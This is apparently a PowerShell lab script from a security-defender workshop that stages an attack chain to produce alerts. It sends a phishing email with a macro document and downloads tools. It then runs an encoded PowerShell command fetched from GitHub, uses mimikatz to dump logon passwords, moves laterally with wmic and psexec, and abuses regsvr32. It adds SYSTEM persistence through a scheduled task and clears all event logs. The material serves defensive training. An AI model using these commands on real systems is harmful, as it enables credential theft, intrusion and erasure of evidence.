function CreateScheduledTask($name, $scriptPath, $localPath, $user, $password)
{
    $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument " -file `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $taskname = $name + " $user";

    if ($user -eq "SYSTEM")
    {
        $params = @{
            Action  = $action
            Trigger = $trigger
            TaskName = $taskname
            User = "System"
            RunLevel = "Highest"
        }
    }
    else
    {
        $params = @{
            Action  = $action
            Trigger = $trigger
            TaskName = $taskname
            User = $user
            Password = $password
            RunLevel = "Highest"
        }
    }
    
    if(Get-ScheduledTask -TaskName $params.TaskName -EA SilentlyContinue) { 
        Set-ScheduledTask @params
        }
    else {
        Register-ScheduledTask @params
    }
}

#executes phishing attack
function SendEmail($userEmail, $attachment)
{
    $password = "#PASSWORD#" | ConvertTo-SecureString

    $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "#USERNAME#", $password;

    ## Define the Send-MailMessage parameters
    $mailParams = @{
        SmtpServer                 = 'smtp.office365.com'
        Port                       = '587' # or '25' if not using TLS
        UseSSL                     = $true ## or not if using non-TLS
        Credential                 = $credential
        From                       = '#USERNAME#'
        To                         = '#USERNAME#'
        Subject                    = "Microsoft eDiscovery Report - Violation"
        Body                       = 'Data Loss Protection has found outbound mail with PII information'
        DeliveryNotificationOption = 'OnFailure', 'OnSuccess'
        Attachments                = $attachment
    }

    ## Send the message
    Send-MailMessage @mailParams;   
}

function ExecuteDocm()
{
    #execute the docm (manually)
    SendEmail $username "DataLossReport.docm"

    #add a record somewhere the docm was opened...copy the word doc to the downloads...
    $downloadsPath = $env:userprofile + "\Downloads";
    copy "$path\DataLossReport.docm" "$downloadsPath";

    #create the password file...
    $line = "#USERNAME#`t#PASSWORD#";
    add-content "c:\temp\data.log" $line;

    #download the zip file
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("https://github.com/solliancenet/#WORKSHOP_NAME#/raw/main/artifacts/day-02/tools.zip","C:\temp\tools.zip")
  
    #try to extract it to c:/tools
    Expand-Archive -LiteralPath 'C:\temp\tools.zip' -DestinationPath C:\ -Force

    #download the powershell file - replace the values
    $username = "#USERNAME#";
    $password = "#PASSWORD#";

    #execute an in-memory powershell attack
    $encodedCommand = Invoke-WebRequest "https://raw.githubusercontent.com/solliancenet/security-defender-workshop-400/main/artifacts/day-02/Enumerate.txt"
    
    #do it...
    powershell.exe -noprofile -command $username, $password | powershell -noprofile -encodedcommand $encodedCommand;

    #enumerate all secrets
    powershell.exe -encodedCommand $data;

    #send the file off - should be done in script...
    #SendEmail $username "secrets.log"

    #once that is executed...we can do more!
    RunMimikatz;

    #Run attack 1
    wmic /node:"10.0.0.6" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\job\svchost.exe";
    wmic /node:"10.0.0.6" process call create "cmd.exe /c c:\job\svchost.exe";

    #run attack 2
    cd c:/tools;
    psexec /accepteula \\10.0.0.6 cmd
    hostname
    mimikatz.exe "priviledge::debug" "sekurlsa::logonpasswords" "exit" >> c:\tools\target-pc.txt
    
    regsvr32.exe /s /u /i:test.sct scrobj.dll
    regsvr32.exe /s /u /i:test.sct PrintIsolationProxy.dll

    #do some encryption
    . "c:\labfiles\#WORKSHOP_NAME#\artifacts\environment-setup\automation\EncryptHelper.ps1"
    EncryptFiles;

    #create a task schedule job...persistence
    $scriptPath = "C:\LabFiles\#WORKSHOP_NAME#\artifacts\day-02\Enumerate.ps1"
    CreateScheduledTask "User_Feed_Backup" $scriptPath $null "SYSTEM" $null;
}

function RunMimikatz()
{
    #do the thing...

    #use all this awesome access we now have!
    GoLateral;
}

function GoLateral()
{
    #connect to another machine
}

function EncryptFiles()
{
    #TODO
}
function SetRegistryKeys()
{
    #TODO
}

function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

function MoveLogs()
{
    Copy-Item -path "$path\logs-03\*" "c:\logs"
}

mkdir c:\job -ea SilentlyContinue;
mkdir c:\tools -ea SilentlyContinue;

$path = "C:\labfiles\#WORKSHOP_NAME#\artifacts\day-02";
cd $path;

#send the email to the user - another hint...
SendEmail $username;

#do the attack manually...
ExecuteDocm

#copy over some "malware" logs
MoveLogs

#clear the event logs
clear-all-event-logs

#referece
#https://github.com/Azure/Azure-Security-Center/blob/main/Simulations/Azure%20Security%20Center%20Security%20Alerts%20Playbook_v2.pdf